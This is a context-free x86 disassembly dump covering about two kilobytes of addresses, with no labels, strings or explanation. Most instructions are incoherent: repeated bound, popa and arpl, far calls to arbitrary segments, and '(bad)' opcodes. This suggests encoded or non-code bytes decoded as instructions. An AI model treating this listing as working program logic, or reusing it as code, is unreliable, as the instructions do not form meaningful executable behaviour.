  43171c:	bound  esp,QWORD PTR [edx+0x62]
  43171f:	scas   al,BYTE PTR es:[edi]
  431720:	xchg   esp,eax
  431721:	scas   al,BYTE PTR es:[edi]
  431722:	mov    ebx,0x63f35bd8
  431727:	bound  esp,QWORD PTR [edx+0x61]
  43172a:	fcomp  DWORD PTR [ebx+0x61]
  43172d:	bound  esp,QWORD PTR [edx+0x62]
  431730:	popa   
  431731:	bound  esi,QWORD PTR [edx+0x62617024]
  431737:	mov    dl,0x24
  431739:	or     eax,0xad622475
  43173e:	adc    al,0x68
  431740:	popa   
  431741:	popa   
  431742:	rep lods eax,DWORD PTR ds:[esi]
  431744:	jne    0x4317a7
  431746:	popa   
  431747:	ror    BYTE PTR ds:0xdb0d2475,cl
  43174d:	and    al,0x68
  43174f:	popa   
  431750:	popa   
  431751:	bound  esi,QWORD PTR [edx-0xd]
  431754:	aas    
  431755:	mov    ds:0xe2176161,eax
  43175a:	popa   
  43175b:	bound  esp,QWORD PTR [edx+0x62]
  43175e:	fsub   DWORD PTR [ebx]
  431760:	popa   
  431761:	bound  esp,QWORD PTR [edx+0x62]
  431764:	popa   
  431765:	mov    dl,0xa5
  431767:	jo     0x4317ca
  431769:	bound  esi,QWORD PTR [edx+0x24750d24]
  43176f:	bound  ebp,QWORD PTR [ebp+0x61616814]
  431775:	repz jmp 0x750d:0xd2616175
  43177d:	and    al,0xd
  43177f:	fisttp DWORD PTR [eax+0x68]
  431782:	popa   
  431783:	popa   
  431784:	(bad)
  431789:	popa   
  43178a:	bound  esp,QWORD PTR [edx+0x62]
  43178d:	fsub   DWORD PTR [ebx]
  43178f:	popa   
  431790:	bound  esp,QWORD PTR [edx+0x62]
  431793:	popa   
  431794:	mov    dl,0xd4
  431796:	jo     0x4317f9
  431798:	bound  esi,QWORD PTR [edx+0x24750d24]
  43179e:	bound  ebp,QWORD PTR [ebp+0x61616814]
  4317a4:	repz int3 
  4317a6:	jne    0x431809
  4317a8:	popa   
  4317a9:	ror    BYTE PTR ds:0xdb0d2475,cl
  4317af:	dec    eax
  4317b0:	push   0xd2626161
  4317b5:	xchg   edx,eax
  4317b6:	pop    ss
  4317b7:	loop   0x43181a
  4317b9:	bound  esp,QWORD PTR [edx+0x62]
  4317bc:	or     eax,0x62627ae2
  4317c1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4317c7:	xor    al,0x5e
  4317c9:	call   0x75ea7976
  4317ce:	std    
  4317cf:	xchg   ebx,eax
  4317d0:	outs   dx,BYTE PTR ds:[esi]
  4317d1:	mov    ds,WORD PTR [edi+0x61]
  4317d4:	popa   
  4317d5:	or     eax,0x130d6075
  4317da:	inc    eax
  4317db:	bound  esp,QWORD PTR [edx+0x62]
  4317de:	(bad)  
  4317df:	outs   dx,DWORD PTR ds:[esi]
  4317e0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4317e6:	pop    esi
  4317e7:	call   0xa5507994
  4317ec:	std    
  4317ed:	sub    eax,0x9322a74f
  4317f2:	mov    ah,0x5f
  4317f4:	pop    edi
  4317f5:	popa   
  4317f6:	popa   
  4317f7:	and    edx,esp
  4317f9:	sub    BYTE PTR [ebx+0x62],ah
  4317fc:	bound  esp,QWORD PTR [ecx+0x61]
  4317ff:	popa   
  431800:	popa   
  431801:	bound  esi,QWORD PTR [edx+0x62617024]
  431807:	mov    dl,0x24
  431809:	or     eax,0xad622475
  43180e:	or     BYTE PTR [eax+0x61],ch
  431811:	popa   
  431812:	repz dec eax
  431814:	sub    al,0x61
  431816:	popa   
  431817:	ror    BYTE PTR ds:0xdb0d2475,cl
  43181d:	and    al,0x68
  43181f:	popa   
  431820:	popa   
  431821:	bound  esi,QWORD PTR [edx-0xd]
  431824:	mov    DWORD PTR [ebx-0x32f29e9f],esp
  43182a:	and    al,0xd
  43182c:	pop    ss
  43182d:	add    DWORD PTR [eax+0x61],ebp
  431830:	popa   
  431831:	pop    ss
  431832:	push   0xb2626170
  431837:	and    al,0x13
  431839:	loop   0x4317c5
  43183b:	bound  esp,QWORD PTR [edx+0x62]
  43183e:	shl    bl,cl
  431840:	aam    0x75
  431842:	popa   
  431843:	popa   
  431844:	ror    BYTE PTR ds:0xdb0d2475,cl
  43184a:	add    DWORD PTR [eax+0x61],ebp
  43184d:	popa   
  43184e:	bound  esi,QWORD PTR [edx+0xd]
  431851:	jne    0x431877
  431853:	or     eax,0x616848db
  431858:	popa   
  431859:	(bad)  
  43185b:	call   0x6262:0x6348e217
  431862:	jo     0x4318c5
  431864:	bound  esi,QWORD PTR [edx-0x591decdc]
  43186a:	bound  esp,QWORD PTR [edx+0x62]
  43186d:	shl    bl,cl
  43186f:	dec    edx
  431870:	sub    al,0x61
  431872:	popa   
  431873:	ror    BYTE PTR ds:0xdb0d2475,cl
  431879:	add    DWORD PTR [eax+0x61],ebp
  43187c:	popa   
  43187d:	bound  esi,QWORD PTR [edx+0xd]
  431880:	jne    0x4318a6
  431882:	or     eax,0x616848db
  431887:	popa   
  431888:	(bad)  
  43188a:	call   0x6262:0x6350e217
  431891:	jo     0x4318f4
  431893:	bound  esi,QWORD PTR [edx+0x64e21324]
  431899:	arpl   WORD PTR [edx+0x62],sp
  43189c:	shl    bl,cl
  43189e:	pusha  
  43189f:	sub    al,0x61
  4318a1:	popa   
  4318a2:	ror    BYTE PTR ds:0xdb0d2475,cl
  4318a8:	add    DWORD PTR [eax+0x61],ebp
  4318ab:	popa   
  4318ac:	bound  esi,QWORD PTR [edx+0xd]
  4318af:	jne    0x4318d5
  4318b1:	or     eax,0x616848db
  4318b6:	popa   
  4318b7:	(bad)  
  4318b9:	call   0x6262:0x6318e217
  4318c0:	fcomp  DWORD PTR [ebx+0x3c]
  4318c3:	arpl   WORD PTR [edx+0x62],sp
  4318c6:	popa   
  4318c7:	fcomp  DWORD PTR [ebx+0x58]
  4318ca:	arpl   WORD PTR [edx+0x62],sp
  4318cd:	popa   
  4318ce:	out    dx,al
  4318cf:	lea    ecx,ds:0x626358e2
  4318d5:	bound  esp,QWORD PTR [edx+0x6358e217]
  4318db:	bound  esp,QWORD PTR [edx-0x28]
  4318de:	and    ebx,DWORD PTR [eax+0x63]
  4318e1:	bound  esp,QWORD PTR [edx-0x6e]
  4318e4:	jae    0x431959
  4318e6:	or     eax,0x626358e2
  4318eb:	bound  ebp,QWORD PTR [edi-0x3e658fba]
  4318f1:	dec    edx
  4318f2:	outs   dx,DWORD PTR ds:[esi]
  4318f3:	fsub   DWORD PTR [edx]
  4318f5:	test   eax,0x48e462c8
  4318fa:	arpl   WORD PTR [edx+0x62],sp
  4318fd:	loop   0x43191b
  4318ff:	out    0x87,eax
  431901:	or     eax,0x626358e2
  431906:	bound  ebp,QWORD PTR [edi-0x3e7e8fba]
  43190c:	dec    edx
  43190d:	outs   dx,DWORD PTR ds:[esi]
  43190e:	fsub   DWORD PTR [edx]
  431910:	cdq    
  431911:	enter  0xe462,0x18
  431915:	arpl   WORD PTR [edx+0x62],sp
  431918:	loop   0x431936
  43191a:	out    0x91,eax
  43191c:	fcomp  DWORD PTR [ebx+0x3c]
  43191f:	arpl   WORD PTR [edx+0x62],sp
  431922:	popa   
  431923:	out    dx,al
  431924:	cmp    DWORD PTR [eax+0x61],esi
  431927:	bound  esi,QWORD PTR [edx-0x791decdc]
  43192d:	bound  esp,QWORD PTR [edx+0x62]
  431930:	shl    bl,cl
  431932:	sahf   
  431933:	sub    al,0x61
  431935:	popa   
  431936:	ror    BYTE PTR ds:0xdb0d2475,cl
  43193c:	cmc    
  43193d:	push   0x72626161
  431942:	or     eax,0xdb0d2475
  431947:	dec    eax
  431948:	push   0xd2626161
  43194d:	call   0x6262:0x633ce217
  431954:	lock les esp,FWORD PTR [edx+0x62]
  431958:	bound  ecx,QWORD PTR ds:0x62627a0b
  43195e:	(bad)  
  43195f:	(bad)  
  431960:	dec    ebx
  431961:	or     ebx,DWORD PTR [edx-0x29c537]
  431967:	pop    esi
  431968:	call   0xe2507b15
  43196d:	inc    eax
  43196e:	bound  esp,QWORD PTR [edx+0x62]
  431971:	test   DWORD PTR [ebx],ecx
  431973:	call   0xa8e8:0x5e343ac9
  43197a:	popa   
  43197b:	shl    BYTE PTR [edx-0x4e],cl
  43197e:	and    al,0x13
  431980:	jne    0x43195d
  431982:	shl    bl,cl
  431984:	ss lahf 
  431986:	popa   
  431987:	popa   
  431988:	ror    BYTE PTR ds:0x62627ae2,cl
  43198e:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431994:	xor    al,0x5e
  431996:	call   0x63157b43
  43199b:	mov    dl,0x24
  43199d:	adc    esi,DWORD PTR [ebp+0x58]
  4319a0:	shl    bl,cl
  4319a2:	stc    
  4319a3:	lahf   
  4319a4:	popa   
  4319a5:	popa   
  4319a6:	shl    BYTE PTR [edx-0x1c],cl
  4319a9:	cmp    al,0x63
  4319ab:	bound  esp,QWORD PTR [edx-0x59]
  4319ae:	xor    DWORD PTR [edx+0x28e22190],esi
  4319b4:	arpl   WORD PTR [edx+0x62],sp
  4319b7:	push   0xd616161
  4319bc:	loop   0x4319fe
  4319be:	bound  esp,QWORD PTR [edx+0x62]
  4319c1:	test   DWORD PTR [ebx],ecx
  4319c3:	call   0x1360:0xcd0d3ac9
  4319ca:	outs   dx,BYTE PTR ds:[esi]
  4319cb:	push   0x61a8e85e
  4319d0:	pop    ss
  4319d1:	jne    0x431a33
  4319d3:	fsub   DWORD PTR [ebx]
  4319d5:	sub    BYTE PTR [ebx+0x62],ah
  4319d8:	bound  esp,QWORD PTR [ecx-0x19]
  4319db:	mov    cl,BYTE PTR ds:0x626240e2
  4319e1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4319e7:	or     eax,0x6e1354cd
  4319ec:	push   0x61a8e85e
  4319f1:	pop    ss
  4319f2:	jne    0x431a48
  4319f4:	lock cmp al,0x5c
  4319f7:	bound  esp,QWORD PTR [edx+0xd]
  4319fa:	jne    0x431a5c
  4319fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4319fd:	jne    0x431a53
  4319ff:	mov    dl,0x81
  431a01:	jp     0x4319b0
  431a03:	loop   0x431a06
  431a05:	imul   esp,DWORD PTR [edx-0x4e],0x5d751324
  431a0c:	shl    bl,cl
  431a0e:	cdq    
  431a0f:	jbe    0x431a72
  431a11:	popa   
  431a12:	pop    ss
  431a13:	loop   0x4319e3
  431a15:	bound  esp,QWORD PTR [edx+0x62]
  431a18:	out    dx,al
  431a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431a1a:	or     eax,0x6262cee2
  431a1f:	bound  edx,QWORD PTR [edi]
  431a21:	loop   0x431a1c
  431a23:	pop    esp
  431a24:	bound  esp,QWORD PTR [edx+0xd]
  431a27:	loop   0x431a69
  431a29:	bound  esp,QWORD PTR [edx+0x62]
  431a2c:	test   DWORD PTR [ebx],ecx
  431a2e:	call   0xa8e8:0x5e343ac9
  431a35:	popa   
  431a36:	or     eax,0x625cf913
  431a3b:	bound  ebp,QWORD PTR [edi-0x6ecf298]
  431a41:	pop    esp
  431a42:	bound  esp,QWORD PTR [edx+0x17]
  431a45:	push   0x627ae20d
  431a4a:	bound  esp,QWORD PTR [edx-0x7b]
  431a4d:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431a53:	call   0xe2ea7c00
  431a58:	into   
  431a59:	bound  esp,QWORD PTR [edx+0x62]
  431a5c:	xchg   ebx,eax
  431a5d:	outs   dx,BYTE PTR ds:[esi]
  431a5e:	loope  0x4319ed
  431a60:	popa   
  431a61:	popa   
  431a62:	or     eax,0x62627ae2
  431a67:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431a6d:	xor    al,0x5e
  431a6f:	call   0x75ea7c1c
  431a74:	pop    ebp
  431a75:	xchg   ebx,eax
  431a76:	outs   dx,BYTE PTR ds:[esi]
  431a77:	mov    ecx,0xd61618d
  431a7c:	loop   0x431af8
  431a7e:	bound  esp,QWORD PTR [edx+0x62]
  431a81:	test   DWORD PTR [ebx],ecx
  431a83:	call   0xa8e8:0x5e343ac9
  431a8a:	popa   
  431a8b:	pop    ss
  431a8c:	loop   0x431a96
  431a8e:	arpl   WORD PTR [edx+0x62],sp
  431a91:	out    dx,al
  431a92:	jl     0x431aa1
  431a94:	loop   0x431ad6
  431a96:	bound  esp,QWORD PTR [edx+0x62]
  431a99:	test   DWORD PTR [ebx],ecx
  431a9b:	call   0x6308:0x130d3ac9
  431aa2:	bound  esp,QWORD PTR [edx+0x13]
  431aa5:	outs   dx,BYTE PTR ds:[esi]
  431aa6:	push   0x61a8e85e
  431aab:	pop    ss
  431aac:	loop   0x431ab6
  431aae:	arpl   WORD PTR [edx+0x62],sp
  431ab1:	or     eax,0xe2a15d75
  431ab6:	or     BYTE PTR [ebx+0x62],ah
  431ab9:	bound  esi,QWORD PTR [ebx-0x7b]
  431abc:	or     eax,0x6262cee2
  431ac1:	bound  edx,QWORD PTR [esi-0x1e]
  431ac4:	or     BYTE PTR [ebx+0x62],ah
  431ac7:	bound  edx,QWORD PTR [edi]
  431ac9:	loop   0x431ae7
  431acb:	pop    esp
  431acc:	bound  esp,QWORD PTR [edx+0xd]
  431acf:	loop   0x431ad9
  431ad1:	arpl   WORD PTR [edx+0x62],sp
  431ad4:	scas   eax,DWORD PTR es:[edi]
  431ad5:	inc    esi
  431ad6:	jo     0x431ad3
  431ad8:	ror    DWORD PTR [edx+0x6f],0x98
  431adc:	or     eax,0x625c1ce2
  431ae1:	bound  edx,QWORD PTR [ebx+0x222d6106]
  431ae7:	or     eax,0x625c1c13
  431aec:	bound  eax,QWORD PTR [eax+ebp*2]
  431aef:	out    dx,al
  431af0:	add    ecx,DWORD PTR ds:0xe2175d75
  431af6:	mov    fs,WORD PTR [ebx+0x62]
  431af9:	bound  ecx,QWORD PTR ds:0x6262cee2
  431aff:	bound  edx,QWORD PTR [edi]
  431b01:	loop   0x431b3b
  431b03:	arpl   WORD PTR [edx+0x62],sp
  431b06:	and    edx,esp
  431b08:	jmp    0x431b6d
  431b0a:	bound  esp,QWORD PTR [edx-0x53]
  431b0d:	loop   0x431b10
  431b0f:	imul   esp,DWORD PTR [ecx],0x6263e6e2
  431b15:	bound  esp,QWORD PTR ds:0xd6901e2
  431b1b:	loop   0x431b08
  431b1d:	arpl   WORD PTR [edx+0x62],sp
  431b20:	test   DWORD PTR [ebx],ecx
  431b22:	call   0xa8e8:0x5e343ac9
  431b29:	popa   
  431b2a:	pop    ss
  431b2b:	loop   0x431b0c
  431b2d:	arpl   WORD PTR [edx+0x62],sp
  431b30:	or     eax,0x6263ebe2
  431b35:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431b3b:	xor    al,0x5e
  431b3d:	call   0xe25a7cea
  431b42:	jecxz  0x431ba7
  431b44:	bound  esp,QWORD PTR [edx+0x21]
  431b47:	loop   0x431b30
  431b49:	arpl   WORD PTR [edx+0x62],sp
  431b4c:	or     al,0xe2
  431b4e:	add    DWORD PTR [ecx+0x21],ebp
  431b51:	loop   0x431bcd
  431b53:	arpl   WORD PTR [edx+0x62],sp
  431b56:	daa    
  431b57:	loop   0x431b5a
  431b59:	imul   ecx,DWORD PTR ds:0x62638ee2,0xeb130d62
  431b63:	arpl   WORD PTR [edx+0x62],sp
  431b66:	(bad)  
  431b67:	outs   dx,DWORD PTR ds:[esi]
  431b68:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431b6e:	pop    esi
  431b6f:	call   0x1fea7d1c
  431b74:	xchg   ebx,eax
  431b75:	outs   dx,BYTE PTR ds:[esi]
  431b76:	add    eax,0xd616156
  431b7b:	loop   0x431b63
  431b7d:	arpl   WORD PTR [edx+0x62],sp
  431b80:	test   DWORD PTR [ebx],ecx
  431b82:	call   0xa8e8:0x5e343ac9
  431b89:	popa   
  431b8a:	or     eax,0x6263df13
  431b8f:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  431b95:	out    0x63,al
  431b97:	bound  esp,QWORD PTR [edx-0x7b]
  431b9a:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431ba0:	call   0xe4507d4d
  431ba5:	mov    fs,WORD PTR [ebx+0x62]
  431ba8:	bound  ebp,QWORD PTR ds:0x934ea758
  431bae:	mov    ah,0xc0
  431bb0:	push   esi
  431bb1:	popa   
  431bb2:	popa   
  431bb3:	or     eax,0x62638ee2
  431bb8:	bound  ecx,QWORD PTR ds:0x6263df13
  431bbe:	bound  ebp,QWORD PTR ds:0xe7130d1f
  431bc4:	arpl   WORD PTR [edx+0x62],sp
  431bc7:	(bad)  
  431bc8:	outs   dx,DWORD PTR ds:[esi]
  431bc9:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431bcf:	pop    esi
  431bd0:	call   0x46f27d7d
  431bd5:	dec    edx
  431bd6:	outs   dx,DWORD PTR ds:[esi]
  431bd7:	pop    ss
  431bd8:	loop   0x431ba8
  431bda:	arpl   WORD PTR [edx+0x62],sp
  431bdd:	or     eax,0x6263cee2
  431be2:	bound  ecx,QWORD PTR ds:0x62637a13
  431be8:	(bad)  
  431be9:	(bad)  
  431bea:	outs   dx,DWORD PTR ds:[esi]
  431beb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431bf1:	pop    esi
  431bf2:	call   0x1fea7d9f
  431bf7:	lds    ebp,FWORD PTR [edx+0xd]
  431bfa:	loop   0x431c76
  431bfc:	arpl   WORD PTR [edx+0x62],sp
  431bff:	test   DWORD PTR [ebx],ecx
  431c01:	call   0xa8e8:0x5e343ac9
  431c08:	popa   
  431c09:	pop    ss
  431c0a:	loop   0x431bda
  431c0c:	arpl   WORD PTR [edx+0x62],sp
  431c0f:	or     eax,0x6263e7e2
  431c14:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431c1a:	xor    al,0x5e
  431c1c:	call   0x13507dc9
  431c21:	into   
  431c22:	arpl   WORD PTR [edx+0x62],sp
  431c25:	xchg   ebx,eax
  431c26:	mov    edx,0xe3131760
  431c2b:	arpl   WORD PTR [edx+0x62],sp
  431c2e:	or     eax,0x6263e3e2
  431c33:	bound  ecx,QWORD PTR ds:0x6263eb13
  431c39:	(bad)  
  431c3a:	(bad)  
  431c3b:	outs   dx,DWORD PTR ds:[esi]
  431c3c:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431c42:	pop    esi
  431c43:	call   0x1fea7df0
  431c48:	xchg   ebx,eax
  431c49:	outs   dx,BYTE PTR ds:[esi]
  431c4a:	add    DWORD PTR [edi+0x61],ebx
  431c4d:	popa   
  431c4e:	or     eax,0x6263e3e2
  431c53:	bound  edx,QWORD PTR [edi]
  431c55:	loop   0x431bfd
  431c57:	arpl   WORD PTR [edx+0x62],sp
  431c5a:	or     eax,0x626338e2
  431c5f:	bound  edx,QWORD PTR [esi-0x1e]
  431c62:	fbld   TBYTE PTR [ebx+0x62]
  431c65:	bound  edx,QWORD PTR [edi]
  431c67:	loop   0x431cdb
  431c69:	arpl   WORD PTR [edx+0x62],sp
  431c6c:	and    edx,esp
  431c6e:	sub    al,0x63
  431c70:	bound  esp,QWORD PTR [edx-0x53]
  431c73:	loop   0x431c76
  431c75:	imul   esp,DWORD PTR [ecx],0x626396e2
  431c7b:	bound  esp,QWORD PTR ds:0x216901e2
  431c81:	loop   0x431c55
  431c83:	arpl   WORD PTR [edx+0x62],sp
  431c86:	mov    bl,0xe2
  431c88:	add    DWORD PTR [ecx+0x21],ebp
  431c8b:	loop   0x431c4b
  431c8d:	arpl   WORD PTR [edx+0x62],sp
  431c90:	and    esp,edx
  431c92:	add    DWORD PTR [ecx+0x21],ebp
  431c95:	loop   0x431c61
  431c97:	arpl   WORD PTR [edx+0x62],sp
  431c9a:	and    eax,0xd6901e2
  431c9f:	loop   0x431ccd
  431ca1:	arpl   WORD PTR [edx+0x62],sp
  431ca4:	test   DWORD PTR [ebx],ecx
  431ca6:	call   0xa8e8:0x5e343ac9
  431cad:	popa   
  431cae:	pop    ss
  431caf:	loop   0x431c67
  431cb1:	arpl   WORD PTR [edx+0x62],sp
  431cb4:	adc    esp,edx
  431cb6:	fisub  DWORD PTR [ebx+0x62]
  431cb9:	bound  edx,QWORD PTR [edi]
  431cbb:	loop   0x431c5f
  431cbd:	arpl   WORD PTR [edx+0x62],sp
  431cc0:	adc    esp,edx
  431cc2:	inc    eax
  431cc3:	arpl   WORD PTR [edx+0x62],sp
  431cc6:	pop    ss
  431cc7:	loop   0x431c8f
  431cc9:	arpl   WORD PTR [edx+0x62],sp
  431ccc:	or     eax,0x6263a6e2
  431cd1:	bound  esp,QWORD PTR [edi+0x6263b6e2]
  431cd7:	bound  edx,QWORD PTR [ebx+0x6168bbd8]
  431cdd:	popa   
  431cde:	or     eax,0x6263a2e2
  431ce3:	bound  esp,QWORD PTR [ecx]
  431ce5:	popa   
  431ce6:	pop    ebx
  431ce7:	loop   0x431cea
  431ce9:	imul   ecx,DWORD PTR ds:0x6263c6e2,0xb7612162
  431cf3:	loop   0x431cf6
  431cf5:	imul   edx,DWORD PTR [ebx],0x6263a7e2
  431cfb:	bound  edx,QWORD PTR [edi]
  431cfd:	loop   0x431c9d
  431cff:	arpl   WORD PTR [edx+0x62],sp
  431d02:	or     eax,0x6263cae2
  431d07:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431d0d:	xor    al,0x5e
  431d0f:	call   0x13507ebc
  431d14:	mov    dh,0x63
  431d16:	bound  esp,QWORD PTR [edx-0x6d]
  431d19:	mov    edx,0x9ee20d60
  431d1e:	arpl   WORD PTR [edx+0x62],sp
  431d21:	or     eax,0x626372e4
  431d26:	bound  ebx,QWORD PTR [edx]
  431d28:	xchg   BYTE PTR [eax-0x1df265fc],dl
  431d2e:	retf   0x6263
  431d31:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431d37:	xor    al,0x5e
  431d39:	call   0x13507ee6
  431d3e:	mov    dh,0x63
  431d40:	bound  esp,QWORD PTR [edx-0x6d]
  431d43:	mov    edx,0xd2e20d60
  431d48:	arpl   WORD PTR [edx+0x62],sp
  431d4b:	test   DWORD PTR [ebx],ecx
  431d4d:	call   0x6372:0xe2563ac9
  431d54:	bound  esp,QWORD PTR [edx-0x6d]
  431d57:	push   es
  431d58:	outs   dx,BYTE PTR ds:[esi]
  431d59:	call   0x130d:0x61a8e85e
  431d60:	fisub  DWORD PTR [ebx+0x62]
  431d63:	(bad)  
  431d64:	(bad)  
  431d65:	outs   dx,DWORD PTR ds:[esi]
  431d66:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  431d6c:	call   0x693:0x61a8e85e
  431d73:	adc    esp,DWORD PTR [edi-0x509d9d9d]
  431d79:	pusha  
  431d7a:	add    al,0x13
  431d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d7d:	arpl   WORD PTR [edx+0x62],sp
  431d80:	sbb    ah,dl
  431d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d83:	arpl   WORD PTR [edx+0x62],sp
  431d86:	or     eax,0x6263ca13
  431d8b:	(bad)  
  431d8c:	(bad)  
  431d8d:	outs   dx,DWORD PTR ds:[esi]
  431d8e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431d94:	pop    esi
  431d95:	call   0xe4507f42
  431d9a:	mov    dh,0x63
  431d9c:	bound  esp,QWORD PTR [edx-0x6d]
  431d9f:	mov    edx,0x72130d4f
  431da4:	arpl   WORD PTR [edx+0x62],sp
  431da7:	add    al,0xf7
  431da9:	mov    DWORD PTR ds:0x6263cae2,ecx
  431daf:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431db5:	xor    al,0x5e
  431db7:	call   0x13507f64
  431dbc:	mov    dh,0x63
  431dbe:	bound  esp,QWORD PTR [edx-0x6d]
  431dc1:	mov    edx,0x9ee20d60
  431dc6:	arpl   WORD PTR [edx+0x62],sp
  431dc9:	or     eax,0x626372e4
  431dce:	bound  ebx,QWORD PTR [edx]
  431dd0:	xchg   BYTE PTR [eax-0x1df265fc],dl
  431dd6:	retf   0x6263
  431dd9:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431ddf:	xor    al,0x5e
  431de1:	call   0x13507f8e
  431de6:	mov    dh,0x63
  431de8:	bound  esp,QWORD PTR [edx-0x6d]
  431deb:	mov    edx,0x96e20d60
  431df0:	arpl   WORD PTR [edx+0x62],sp
  431df3:	test   DWORD PTR [ebx],ecx
  431df5:	call   0x6372:0xe2563ac9
  431dfc:	bound  esp,QWORD PTR [edx-0x6d]
  431dff:	push   es
  431e00:	outs   dx,BYTE PTR ds:[esi]
  431e01:	call   0x130d:0x61a8e85e
  431e08:	inc    eax
  431e09:	arpl   WORD PTR [edx+0x62],sp
  431e0c:	(bad)  
  431e0d:	outs   dx,DWORD PTR ds:[esi]
  431e0e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  431e14:	call   0x693:0x61a8e85e
  431e1b:	adc    esp,DWORD PTR [edi-0x509d9d9d]
  431e21:	pusha  
  431e22:	add    al,0x13
  431e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431e25:	arpl   WORD PTR [edx+0x62],sp
  431e28:	sbb    ah,dl
  431e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431e2b:	arpl   WORD PTR [edx+0x62],sp
  431e2e:	or     eax,0x6263ca13
  431e33:	(bad)  
  431e34:	(bad)  
  431e35:	outs   dx,DWORD PTR ds:[esi]
  431e36:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431e3c:	pop    esi
  431e3d:	call   0xe4507fea
  431e42:	mov    dh,0x63
  431e44:	bound  esp,QWORD PTR [edx-0x6d]
  431e47:	mov    edx,0x72130d4f
  431e4c:	arpl   WORD PTR [edx+0x62],sp
  431e4f:	add    al,0xf7
  431e51:	mov    DWORD PTR ds:0x626396e2,ecx
  431e57:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431e5d:	xor    al,0x5e
  431e5f:	call   0x1350800c
  431e64:	mov    esi,0xd6626263
  431e69:	outs   dx,DWORD PTR ds:[esi]
  431e6a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431e70:	pop    esi
  431e71:	call   0xbad6801e
  431e76:	pop    ds
  431e77:	push   esi
  431e78:	loop   0x431e30
  431e7a:	arpl   WORD PTR [edx+0x62],sp
  431e7d:	pop    ss
  431e7e:	loop   0x431e36
  431e80:	arpl   WORD PTR [edx+0x62],sp
  431e83:	lock sub al,0x63
  431e86:	bound  esp,QWORD PTR [edx+0xd]
  431e89:	loop   0x431e71
  431e8b:	arpl   WORD PTR [edx+0x62],sp
  431e8e:	test   DWORD PTR [ebx],ecx
  431e90:	call   0x632c:0x130d3ac9
  431e97:	bound  esp,QWORD PTR [edx-0x2a]
  431e9a:	outs   dx,DWORD PTR ds:[esi]
  431e9b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431ea1:	pop    esi
  431ea2:	call   0xe450804f
  431ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431ea8:	arpl   WORD PTR [edx+0x62],sp
  431eab:	or     eax,0x6263960b
  431eb0:	(bad)  
  431eb1:	(bad)  
  431eb2:	dec    ebx
  431eb3:	or     ebx,DWORD PTR [edx-0x29c537]
  431eb9:	pop    esi
  431eba:	call   0xbad68067
  431ebf:	xchg   di,ax
  431ec1:	outs   dx,DWORD PTR ds:[esi]
  431ec2:	adc    ebp,DWORD PTR [esi+0x3b]
  431ec5:	pop    esi
  431ec6:	call   0x13508073
  431ecb:	out    0x63,al
  431ecd:	bound  esp,QWORD PTR [edx-0x2a]
  431ed0:	outs   dx,DWORD PTR ds:[esi]
  431ed1:	or     ebx,DWORD PTR [edx+0x13563ac9]
  431ed7:	fbld   TBYTE PTR [ebx+0x62]
  431eda:	bound  edx,QWORD PTR [ebx]
  431edc:	outs   dx,BYTE PTR ds:[esi]
  431edd:	push   0x61a8e85e
  431ee2:	pop    ss
  431ee3:	loop   0x431ec4
  431ee5:	arpl   WORD PTR [edx+0x62],sp
  431ee8:	out    dx,al
  431ee9:	jl     0x431ef8
  431eeb:	loop   0x431ed3
  431eed:	arpl   WORD PTR [edx+0x62],sp
  431ef0:	test   DWORD PTR [ebx],ecx
  431ef2:	call   0x63df:0x130d3ac9
  431ef9:	bound  esp,QWORD PTR [edx+0x13]
  431efc:	outs   dx,BYTE PTR ds:[esi]
  431efd:	push   0x61a8e85e
  431f02:	pop    ss
  431f03:	loop   0x431ee4
  431f05:	arpl   WORD PTR [edx+0x62],sp
  431f08:	lock jno 0x431f60
  431f0b:	bound  esp,QWORD PTR [edx+0xd]
  431f0e:	loop   0x431f8a
  431f10:	bound  esp,QWORD PTR [edx+0x62]
  431f13:	test   DWORD PTR [ebx],ecx
  431f15:	call   0xa8e8:0x5e343ac9
  431f1c:	popa   
  431f1d:	pop    ss
  431f1e:	loop   0x431f6c
  431f20:	arpl   WORD PTR [edx+0x62],sp
  431f23:	bound  esi,QWORD PTR [edx-0x31f49da3]
  431f29:	bound  esp,QWORD PTR [edx+0x62]
  431f2c:	repz mov esi,0x17616175
  431f32:	loop   0x431f80
  431f34:	arpl   WORD PTR [edx+0x62],sp
  431f37:	or     eax,0xb85ad75
  431f3c:	call   0xa8e8:0x5e343ac9
  431f43:	popa   
  431f44:	ror    BYTE PTR ds:0x6262e6e2,cl
  431f4a:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431f50:	xor    al,0x5e
  431f52:	call   0x631580ff
  431f57:	or     ecx,DWORD PTR [ebx+eiz*2+0x62]
  431f5b:	bound  ecx,QWORD PTR ds:0x62627ae2
  431f61:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431f67:	xor    al,0x5e
